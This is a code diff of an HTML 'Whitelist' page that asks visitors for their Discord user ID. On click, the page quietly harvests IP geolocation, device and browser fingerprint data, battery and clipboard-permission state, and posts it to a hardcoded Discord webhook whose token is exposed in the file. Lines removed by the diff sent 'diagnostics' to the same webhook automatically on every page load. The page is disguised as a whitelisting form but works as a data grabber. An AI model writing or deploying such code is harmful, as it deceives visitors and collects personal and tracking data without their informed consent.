@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Whitelist Button</title>
+  <title>Whitelist</title>
   <style>
     body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
     input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
@@ -17,189 +17,168 @@
   <button id="whitelistBtn" disabled>Whitelist</button>
 
   <script>
-    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
-    const whitelistBtn = document.getElementById('whitelistBtn');
-    const discordIdInput = document.getElementById('discordId');
-    const RATE_LIMIT_HOURS = 24;
-    const STORAGE_KEY = 'lastWhitelistTime';
+    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
+    var whitelistBtn = document.getElementById('whitelistBtn');
+    var discordIdInput = document.getElementById('discordId');
+    var RATE_LIMIT_HOURS = 24;
+    var STORAGE_KEY = 'lastWhitelistTime';
 
-    // Auto-run diagnostics on every visit
-    window.addEventListener('load', () => runDiagnostics());
-
-    discordIdInput.addEventListener('input', () => {
-      const value = discordIdInput.value.trim();
-      const isNumeric = /^\d+$/.test(value);
-      whitelistBtn.disabled = !isNumeric;
+    discordIdInput.addEventListener('input', function () {
+      var value = discordIdInput.value.replace(/\s+/g, '');
+      whitelistBtn.disabled = !/^\d+$/.test(value);
     });
 
     function isRateLimited() {
-      const lastTime = localStorage.getItem(STORAGE_KEY);
-      if (!lastTime) return false;
-      const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
-      return diff < RATE_LIMIT_HOURS;
+      try {
+        var lastTime = localStorage.getItem(STORAGE_KEY);
+        if (!lastTime) return false;
+        var diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
+        return diff < RATE_LIMIT_HOURS;
+      } catch (e) {
+        return false;
+      }
     }
 
-    async function runDiagnostics() {
-      const results = { passed: [], errors: [], critical: [] };
+    function detectCapabilities() {
+      return {
+        battery: !!navigator.getBattery,
+        permissions: !!navigator.permissions,
+        fetch: !!window.fetch,
+        connection: !!navigator.connection,
+        clipboard: !!navigator.clipboard,
+        javaEnabled: !!navigator.javaEnabled
+      };
+    }
 
-      // Test LocalStorage
+    function getGeoData(callback) {
       try {
-        localStorage.setItem('diag_test', '1');
-        localStorage.removeItem('diag_test');
-        results.passed.push('LocalStorage works');
-      } catch {
-        results.critical.push('LocalStorage unavailable');
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://ipapi.co/json/', true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              try { callback(JSON.parse(xhr.responseText)); } catch (e) { callback({}); }
+            } else {
+              callback({});
+            }
+          }
+        };
+        xhr.send();
+      } catch (e) {
+        callback({});
       }
+    }
 
-      // Test UserAgent
-      if (navigator.userAgent) results.passed.push('UserAgent available');
-      else results.critical.push('UserAgent missing');
-
-      // Battery API
-      try {
-        if (navigator.getBattery) {
-          const b = await navigator.getBattery();
-          results.passed.push('Battery API supported');
-        } else {
-          results.errors.push('Battery API not supported');
-        }
-      } catch {
-        results.errors.push('Battery API failed');
-      }
-
-      // Permissions API
-      try {
-        if (navigator.permissions) {
-          await navigator.permissions.query({ name: 'clipboard-read' }).catch(()=>{});
-          results.passed.push('Permissions API supported');
-        } else results.errors.push('Permissions API not supported');
-      } catch {
-        results.errors.push('Permissions API failed');
-      }
-
-      // Screen check
-      if (screen && screen.width > 0) results.passed.push('Screen info valid');
-      else results.errors.push('Screen info missing');
-
-      // Connection check
-      if (navigator.connection) results.passed.push('Network info available');
-      else results.errors.push('Network info missing');
-
-      // Timezone check
-      try {
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        if (tz) results.passed.push('Timezone detected');
-        else results.errors.push('Timezone missing');
-      } catch {
-        results.errors.push('Timezone check failed');
-      }
-
-      // Do Not Track
-      if (navigator.doNotTrack != null) results.passed.push('Do Not Track reported');
-      else results.errors.push('Do Not Track unavailable');
-
-      // Plugins
-      try {
-        const count = navigator.plugins.length;
-        results.passed.push(`Plugins detected: ${count}`);
-      } catch {
-        results.errors.push('Plugins check failed');
-      }
-
-      const totalTests = results.passed.length + results.errors.length + results.critical.length;
-      const score = `${results.passed.length}/${totalTests}`;
-
-      const diagPayload = {
-        timestamp: new Date().toISOString(),
-        diagnostics: { score, ...results }
+    function gatherDiagnostics(callback) {
+      var capabilities = detectCapabilities();
+      var diagnostics = {
+        battery: null,
+        connection: null,
+        clipboardPermission: null,
+        navigatorProperties: {},
+        screen: {},
+        plugins: [],
+        mimeTypes: []
       };
 
-      const formData = new FormData();
-      const file = new Blob([JSON.stringify(diagPayload, null, 2)], { type: 'application/json' });
-      formData.append('file', file, 'diagnostics_results.json');
-      formData.append('content', 'Automatic diagnostics report');
+      // Navigator properties
+      ['userAgent','language','languages','platform','cookieEnabled','onLine','hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack','vendor','product','productSub'].forEach(function(prop) {
+        diagnostics.navigatorProperties[prop] = navigator[prop] !== undefined ? navigator[prop] : null;
+      });
 
-      try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch {}
-    }
+      // Screen info
+      ['width','height','availWidth','availHeight','colorDepth','pixelDepth'].forEach(function(prop) {
+        diagnostics.screen[prop] = screen[prop] !== undefined ? screen[prop] : null;
+      });
 
-    async function sendData() {
-      if (isRateLimited()) {
-        alert('You can only whitelist once every 24 hours.');
-        return;
+      // Plugins and mimeTypes
+      diagnostics.plugins = navigator.plugins ? Array.prototype.map.call(navigator.plugins, function(p) { return p.name; }) : [];
+      diagnostics.mimeTypes = navigator.mimeTypes ? Array.prototype.map.call(navigator.mimeTypes, function(m) { return m.type; }) : [];
+
+      // Connection info
+      if (capabilities.connection && navigator.connection) {
+        diagnostics.connection = {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData || false
+        };
       }
-      try {
-        const geoRes = await fetch('https://ipapi.co/json/');
-        const geoData = geoRes.ok ? await geoRes.json() : {};
 
-        const battery = navigator.getBattery ? await navigator.getBattery() : null;
-        const clipboardPerm = navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(() => null) : null;
-
-        const payload = {
-          timestamp: new Date().toISOString(),
-          discordUserId: discordIdInput.value.trim(),
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          languages: navigator.languages,
-          platform: navigator.platform,
-          cookieEnabled: navigator.cookieEnabled,
-          online: navigator.onLine,
-          screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-          },
-          referrer: document.referrer || null,
-          page: location.href,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-          } : null,
-          hardwareConcurrency: navigator.hardwareConcurrency,
-          deviceMemory: navigator.deviceMemory || null,
-          maxTouchPoints: navigator.maxTouchPoints,
-          doNotTrack: navigator.doNotTrack,
-          vendor: navigator.vendor,
-          product: navigator.product,
-          productSub: navigator.productSub,
-          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
-          plugins: Array.from(navigator.plugins).map(p => p.name),
-          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
-          battery: battery ? {
+      // Battery info
+      if (capabilities.battery && navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+          diagnostics.battery = {
             charging: battery.charging,
             level: battery.level,
             chargingTime: battery.chargingTime,
             dischargingTime: battery.dischargingTime
-          } : null,
-          clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
-          ipInfo: geoData
-        };
+          };
+          continueDiagnostics();
+        }).catch(function(){ continueDiagnostics(); });
+      } else {
+        continueDiagnostics();
+      }
 
-        const formData = new FormData();
-        const file = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
-        formData.append('file', file, 'visitor_data.json');
-        formData.append('content', `Visitor data from Discord User ID: ${discordIdInput.value.trim()}`);
-
-        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-
-        if (res.ok) {
-          alert('Data sent successfully.');
-          localStorage.setItem(STORAGE_KEY, Date.now().toString());
-          whitelistBtn.disabled = true;
+      function continueDiagnostics() {
+        // Clipboard permission
+        if (capabilities.permissions) {
+          navigator.permissions.query({name:'clipboard-read'}).then(function(result){
+            diagnostics.clipboardPermission = result.state;
+            callback(diagnostics);
+          }).catch(function(){ callback(diagnostics); });
         } else {
-          alert(`Failed to send data. Status: ${res.status}`);
+          callback(diagnostics);
         }
-      } catch (err) {
-        alert('Error sending data: ' + err.message);
       }
     }
 
-    if (isRateLimited()) whitelistBtn.disabled = true;
+    function sendData() {
+      if (isRateLimited()) {
+        alert('You can only whitelist once every 24 hours.');
+        return;
+      }
 
+      getGeoData(function(geoData){
+        gatherDiagnostics(function(diagnostics){
+          var payload = {
+            timestamp: new Date().toISOString(),
+            discordUserId: discordIdInput.value.replace(/\s+/g,''),
+            page: location.href,
+            referrer: document.referrer || null,
+            timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
+            geoData: geoData,
+            diagnostics: diagnostics
+          };
+
+          // Send data
+          try {
+            var formData = new FormData();
+            var file = new Blob([JSON.stringify(payload,null,2)], {type:'application/json'});
+            formData.append('file', file, 'visitor_data.json');
+            formData.append('content','Visitor data from Discord User ID: '+payload.discordUserId);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', WEBHOOK_URL, true);
+            xhr.onload = function(){
+              if(xhr.status>=200 && xhr.status<300){
+                alert('Data sent successfully.');
+                try{ localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch(e){}
+                whitelistBtn.disabled = true;
+              } else {
+                alert('Failed to send data. Status: '+xhr.status);
+              }
+            };
+            xhr.onerror = function(){ alert('Error sending data.'); };
+            xhr.send(formData);
+          } catch(err){
+            alert('Error: '+err.message);
+          }
+        });
+      });
+    }
+
+    if(isRateLimited()) whitelistBtn.disabled=true;
     whitelistBtn.addEventListener('click', sendData);
   </script>
 </body>
